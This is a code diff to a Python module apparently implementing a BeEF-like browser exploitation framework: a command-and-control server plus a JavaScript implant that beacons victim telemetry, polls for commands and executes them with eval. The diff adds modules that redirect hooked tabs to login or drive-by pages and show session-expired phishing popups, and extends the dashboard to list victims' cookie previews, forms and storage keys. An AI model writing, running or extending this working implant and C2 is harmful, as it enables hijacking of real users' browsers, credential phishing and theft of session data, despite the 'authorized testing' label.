@@ -1,6 +1,7 @@
 """Built-in BeEF-like Browser Exploitation Framework (Hook C2 Server + Interactive Attack Modules + XSS Handoff)."""
 import http.server
 import json
+import re
 import socketserver
 import threading
 import time
@@ -13,6 +14,7 @@ from core.telemetry import TELEMETRY
 
 _BEEF_LOCK = threading.RLock()
 _GLOBAL_BEEF = None
+ONLINE_WINDOW_S = 12.0  # a zombie counts as online when it beaconed within this window
 
 HOOK_JS_TEMPLATE = """/* bugsBounty BeEF-Style Browser Implant (Authorized Security Testing) */
 (function(){
@@ -59,13 +61,25 @@ HOOK_JS_TEMPLATE = """/* bugsBounty BeEF-Style Browser Implant (Authorized Secur
       ts: Date.now()
     };
   }
+  var ALIVE = true;
+  window.__BEEF_STOP__ = function() {
+    ALIVE = false;
+    window.__BUGSBOUNTY_HOOKED__ = false;
+  };
   send("/beacon", gatherTelemetry());
-  setInterval(function(){ send("/beacon", gatherTelemetry()); }, 4000);
+  setInterval(function(){ if (!ALIVE) return; send("/beacon", gatherTelemetry()); }, 4000);
   setInterval(function(){
+    if (!ALIVE) return;
     fetch(C2 + "/poll?session=" + encodeURIComponent(SID))
       .then(function(r){ return r.json(); })
       .then(function(cmds){
         (cmds.commands || cmds.queue || []).forEach(function(cmd){
+          if (cmd.module === "unhook") {
+            send("/result", {id: cmd.id, cmd_id: cmd.id, module: "unhook", session: SID, ok: true,
+              output: "hook removed from " + location.href});
+            window.__BEEF_STOP__();
+            return;
+          }
           Promise.resolve()
             .then(function(){ return (0, eval)(cmd.js); })
             .then(function(val){
@@ -232,7 +246,132 @@ BEEF_MODULES: list[dict] = [
   return "Banner injected onto " + document.title;
 })()""",
     },
+    {
+        "id": "redirect_browser",
+        "name": "Redirect Hooked Browser",
+        "category": "Browser Control",
+        "risk": "medium",
+        "description": "Navigates the hooked tab to a URL you supply (login lure, OAuth bounce or drive-by landing page).",
+        "fields": [
+            {"key": "url", "label": "Redirect URL", "placeholder": "https://example.com/login", "required": True},
+        ],
+        "js": """(function(u){
+  setTimeout(function(){ try { location.href = u; } catch (e) {} }, 350);
+  return "redirecting " + location.host + " -> " + u;
+})(__URL__)""",
+    },
+    {
+        "id": "popup_message",
+        "name": "Popup Message on Hooked Page",
+        "category": "Social Engineering",
+        "risk": "low",
+        "description": "Shows a message box inside the victim tab (session-expired lure, maintenance notice, consent prompt).",
+        "fields": [
+            {"key": "message", "label": "Message text", "default": "Your session expired. Please sign in again.",
+             "placeholder": "Your session expired. Please sign in again.", "required": True},
+        ],
+        "js": """(function(m){
+  setTimeout(function(){ try { window.alert(m); } catch (e) {} }, 300);
+  return "popup shown to " + (document.title || location.href) + ": " + m;
+})(__MESSAGE__)""",
+    },
+    {
+        "id": "unhook",
+        "name": "Unhook / Delete This Browser",
+        "category": "Browser Control",
+        "risk": "low",
+        "description": "Tells the implant to stop beaconing and polling, then drops the session from the C2. Same as BeEF's delete-zombie.",
+        "fields": [],
+        "js": """window.__BEEF_STOP__ ? window.__BEEF_STOP__() : "no-op"; "unhook requested" """,
+    },
 ]
+
+BEEF_MODULE_BY_ID: dict[str, dict] = {m["id"]: m for m in BEEF_MODULES}
+BEEF_CATEGORY_ORDER = [
+    "Credential Harvesting", "Spying & Surveillance", "Network & App Pivot",
+    "Social Engineering", "DOM Manipulation", "Host Reconnaissance", "Browser Control",
+]
+
+
+def module_fields(module: dict) -> list[dict]:
+    return list(module.get("fields") or [])
+
+
+def build_module_js(module: dict, values: dict | None = None) -> str:
+    """Render a module's JS, substituting its declared fields (JSON-encoded) into __PLACEHOLDERS__."""
+    js = module.get("js", "")
+    values = values or {}
+    for field in module_fields(module):
+        key = field["key"]
+        val = values.get(key, field.get("default", ""))
+        val = "" if val is None else str(val)
+        if field.get("required") and not val.strip():
+            raise ValueError(f"Module `{module['id']}` requires `{key}`")
+        js = js.replace("__" + key.upper() + "__", json.dumps(val))
+    return js
+
+
+_UA_BROWSERS = [
+    ("Edge", r"Edg(?:e|A|iOS)?/([\d.]+)"),
+    ("Opera", r"(?:OPR|Opera)/([\d.]+)"),
+    ("Samsung Internet", r"SamsungBrowser/([\d.]+)"),
+    ("Yandex", r"YaBrowser/([\d.]+)"),
+    ("Firefox", r"(?:Firefox|FxiOS)/([\d.]+)"),
+    ("Chrome", r"(?:Chrome|CriOS|Chromium)/([\d.]+)"),
+    ("Safari", r"Version/([\d.]+)[^)]*Safari/"),
+    ("curl", r"curl/([\d.]+)"),
+    ("python-requests", r"python-requests/([\d.]+)"),
+    ("Internet Explorer", r"(?:MSIE |rv:)([\d.]+)"),
+]
+
+
+def parse_ua(ua: str) -> dict:
+    """Best-effort browser / OS / engine identification, the way BeEF labels its zombies."""
+    ua = ua or ""
+    low = ua.lower()
+    name, version = "Unknown", ""
+    for label, pattern in _UA_BROWSERS:
+        m = re.search(pattern, ua)
+        if m:
+            name = label
+            version = m.group(1).split(".")[0]
+            break
+    if "HeadlessChrome" in ua:
+        name = "Headless Chrome"
+
+    if "iphone" in low or "ipad" in low or "ipod" in low:
+        os_name = "iOS"
+    elif "android" in low:
+        os_name = "Android"
+    elif "cros" in low:
+        os_name = "ChromeOS"
+    elif "windows" in low:
+        os_name = "Windows"
+    elif "mac os x" in low or "macintosh" in low:
+        os_name = "macOS"
+    elif "linux" in low:
+        os_name = "Linux"
+    else:
+        os_name = "Unknown"
+
+    if name in ("Firefox",):
+        engine = "Gecko"
+    elif name == "Safari" or os_name == "iOS":
+        engine = "WebKit"
+    elif name in ("Chrome", "Chromium", "Edge", "Opera", "Samsung Internet", "Yandex"):
+        engine = "Blink"
+    else:
+        engine = "Unknown"
+
+    major = f" {version}" if version else ""
+    return {
+        "name": name,
+        "version": version,
+        "engine": engine,
+        "os": os_name,
+        "mobile": ("mobile" in low) or os_name in ("iOS", "Android"),
+        "label": f"{name}{major} · {os_name}",
+    }
 
 DEMO_VICTIM_HTML = """<!DOCTYPE html>
 <html lang="en">
@@ -380,6 +519,8 @@ class BeefServer:
                     item["completed_at"] = now
                     break
         TELEMETRY.record_c2("beef_cmd", f"BeEF result `{cmd_id}` from `{sid}`", detail=str(body.get("output", ""))[:160])
+        if body.get("module") == "unhook" and body.get("ok", True):
+            self.remove_session(sid)
         return {"ok": True}
 
     def handle_loot(self, sid: str, fid: str, remote: str, body: dict) -> dict:
@@ -533,6 +674,20 @@ class BeefServer:
                 return [s for s in vals if s.get("finding_id") == finding_id or s.get("fid") == finding_id]
             return vals
 
+    def remove_session(self, sid: str) -> bool:
+        """Drop a zombie and everything queued for it (delete-session in the BeEF UI)."""
+        with self._lock:
+            existed = self.sessions.pop(sid, None) is not None
+            self.command_queues.pop(sid, None)
+            self.command_results.pop(sid, None)
+            self.command_log = [c for c in self.command_log if c.get("sid") != sid]
+            for cid, (owner, _entry) in list(self._cmd_to_session.items()):
+                if owner == sid:
+                    self._cmd_to_session.pop(cid, None)
+        if existed:
+            TELEMETRY.record_c2("beef_hook", f"BeEF session `{sid}` deleted from C2")
+        return existed
+
     def queue_command(self, sid: str, js_code: str, module_name: str = "custom_js", label: str = "") -> str:
         cmd_id = f"cmd-{uuid.uuid4().hex[:6]}"
         entry = {"id": cmd_id, "js": js_code, "module": module_name, "label": label or module_name}
@@ -564,19 +719,48 @@ class BeefServer:
         h_url = public_hook_url or self.hook_url("xss")
         with self._lock:
             sessions_list = []
-            for sid, data in sorted(self.sessions.items(), key=lambda kv: kv[1].get("last_seen", 0), reverse=True):
+            for sid, data in self.sessions.items():
+                tel = data.get("telemetry") or {}
                 age = round(now - (data.get("last_seen") or 0), 1)
+                browser = parse_ua(tel.get("ua") or "")
+                href = tel.get("href") or ""
                 sessions_list.append({
                     **data,
                     "age_sec": age,
-                    "online": age < 12.0,
+                    "online": age < ONLINE_WINDOW_S,
+                    "host": urllib.parse.urlparse(href).netloc or tel.get("origin", "") or data.get("remote", ""),
+                    "title": tel.get("title") or "",
+                    "href": href,
+                    "origin": tel.get("origin") or "",
+                    "browser": browser["label"],
+                    "browser_name": browser["name"],
+                    "browser_version": browser["version"],
+                    "engine": browser["engine"],
+                    "os": browser["os"],
+                    "mobile": browser["mobile"],
+                    "ua": tel.get("ua") or "",
+                    "platform": tel.get("platform") or "",
+                    "screen": tel.get("screen") or "",
+                    "lang": tel.get("lang") or "",
+                    "cookies": tel.get("cookie_len") or 0,
+                    "cookie_preview": tel.get("cookie_preview") or "",
+                    "forms": tel.get("forms") or 0,
+                    "inputs": tel.get("inputs") or 0,
+                    "links": tel.get("links") or 0,
+                    "local_keys": tel.get("local_keys") or 0,
+                    "queued": len(self.command_queues.get(sid) or []),
+                    "commands_run": len(data.get("commands") or []),
                 })
+            # BeEF ordering: live zombies first, then most recently seen
+            sessions_list.sort(key=lambda s: (0 if s["online"] else 1, -(s.get("last_seen") or 0)))
+            online_count = sum(1 for s in sessions_list if s["online"])
             return {
                 "hook_endpoint": self.hook_url(),
                 "public_hook_url": h_url,
                 "sessions": dict(self.sessions),
                 "sessions_list": sessions_list,
-                "online_count": sum(1 for s in sessions_list if s["online"]),
+                "online_count": online_count,
+                "offline_count": len(sessions_list) - online_count,
                 "total_sessions": len(sessions_list),
                 "script_pulls": list(reversed(self.script_pulls[-30:])),
                 "command_log": list(reversed(self.command_log[-50:])),
